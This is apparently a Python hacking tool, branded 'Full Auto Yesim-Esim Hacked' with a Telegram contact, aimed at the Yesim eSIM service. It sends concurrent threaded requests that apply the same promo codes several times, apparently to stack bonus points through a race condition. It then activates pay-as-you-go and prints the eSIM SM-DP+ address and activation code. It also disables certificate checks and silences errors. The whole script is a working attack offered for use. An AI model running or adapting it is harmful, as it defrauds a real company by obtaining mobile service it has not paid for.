import requests
import time
import warnings
import sys
import threading

# ------- SSL hata ayıklaması için
# Yani konsoldan gizlemek için
def handle_warning(message, category, filename, lineno, file=None, line=None):
    if category == requests.packages.urllib3.exceptions.InsecureRequestWarning:
        pass

warnings.showwarning = handle_warning

with warnings.catch_warnings():
    warnings.simplefilter("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)


Y = "\033[38;2;0;255;0m"
K = "\033[38;2;255;0;0m"
T = "\033[38;2;255;128;0m"
R = "\033[0m"


#---------- Gövde Gösterisi :D -----#
print("\033[38;2;0;153;255m")
print("""
________              ______
___  __ \_____ __________  /__
__  / / /  __ `/_  ___/_  //_/
_  /_/ // /_/ /_  /   _  ,<
/_____/ \__,_/ /_/    /_/|_|
""")
print("\033[0m")

print("\033[38;2;255;128;0m")
print("                        ENZA")
print("\033[38;2;255;0;255m")
print("    Gemiler battı diye")
print("\033[38;2;153;0;204m")
print("     Acırmı denizin canı..")
print("\033[0m")

print("\033[0;38;2;153;0;204m")
print("TG: @dark_enza")
print("\033[0m")

print("\033[38;2;0;153;255m")
print("Full Auto Yesim-Esim Hacked")
print("\033[0m")


# -------------------- eposta belirleme --------------------#
sonuc4 = input("Web Key'i Gir: ")


sys.stderr = open('/dev/null', 'w')
# ------------- Y Coin Çekme -----------#
urls = [
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=SHOPCASH&lang=en",
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=SUMMER23&lang=en",
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=SHOPCASH&lang=en",
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=SUMMER23&lang=en"
]

def make_request(url):
    res_puan = requests.get(url, verify=False)
    toplam = res_puan.json()[0]
    if toplam == 'success':
    	print(Y+"[+]500 Puan Eklendi"+R)
    else:
    	print(K+"•Puan Eklenemedi"+R)

threads = []
for url in urls:
    thread = threading.Thread(target=make_request, args=(url,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
    
time.sleep(5)

urls = [
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=MAIL200&lang=en",
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=XPEP156&lang=en",
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=MAIL200&lang=en",
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=XPEP156&lang=en"
]

def make_request(url):
    res_puan = requests.get(url, verify=False)
    toplam = res_puan.json()[0]
    if toplam == 'success':
    	print("[+]200 Puan Eklendi")
    else:
    	print("•Puan Eklenemedi")

threads = []
for url in urls:
    thread = threading.Thread(target=make_request, args=(url,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()


#--------------- Pay As You Go Aktifle -------#
time.sleep(5)
dark = requests.get("https://iweb.yesim.app/v1/activate_pay_as_you_go?web_key="+sonuc4+"&lang=en", timeout=5)
sonuc6 = dark.json()
if sonuc6 == "OK":
	print(Y+"[+]KareKod istendi "+R)
else:
	print(K+"[-]Karekod Alınamadı"+R)
	print(K+"Bir Sorun Var Admine Ulaş @dark_enza"+R)
	raise SystemExit()


#---------- Kare Kodu Denetle --------#
try:
    dark1 = requests.get("https://iweb.yesim.app/v1/show_my_qrs?web_key="+sonuc4+"&lang=en", timeout=5)
    sonuc7 = dark1.json()["Qrs"]
    aktivasyon = sonuc7[0][1]
    smdp = sonuc7[0][2]
    print(Y+"[=]SM+DP Adresi: "+smdp)
    print(Y+"[=]Aktivasyon Kodu: "+aktivasyon)
    print(T+"Android: LPA:1$"+smdp+"$"+aktivasyon)
except:
    console.set_color(1.0, 0.0, 0.0)
    print(K+"[-]KareKod Oluşturulamadı")
    print(K+"Bir Sorun Var Admine Ulaş @dark_enza")
    raise SystemExit()
